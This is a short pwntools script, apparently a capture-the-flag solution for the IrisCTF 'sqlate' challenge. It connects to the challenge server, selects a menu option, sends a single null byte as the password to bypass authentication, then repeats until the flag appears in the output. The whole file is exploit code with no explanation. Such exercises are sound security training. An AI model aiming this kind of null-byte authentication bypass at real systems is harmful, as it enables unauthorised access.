#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "sqlate.chal.irisc.tf"
PORT = 10000

gdbscript = '''
'''

while True:
    if LOCAL:
        if DEBUG:
            r = gdb.debug([exe.path], gdbscript=gdbscript)
        else:
            r = process([exe.path])
    else:
        r = remote(HOST, PORT)


    r.sendlineafter(b'>', b'5')
    r.sendlineafter(b'Enter Password?: ', b'\x00')
    r.sendlineafter(b'>', b'7')

    maybe = r.readline()
    if b'irisctf' in maybe:
        print(maybe)
        break

